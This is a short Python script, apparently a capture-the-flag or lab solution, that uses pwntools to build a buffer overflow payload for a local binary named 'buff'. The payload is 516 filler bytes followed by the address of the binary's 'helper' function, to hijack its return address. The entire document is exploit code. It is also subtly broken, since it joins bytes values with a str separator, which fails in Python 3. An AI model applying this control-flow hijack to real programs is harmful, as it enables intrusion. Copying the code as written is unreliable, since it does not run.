#!/usr/bin/env python3

from pwn import *

elf = ELF("./buff")

payload = "".join([b"A" * 516, p32(elf.symbols['helper'])])

print(payload)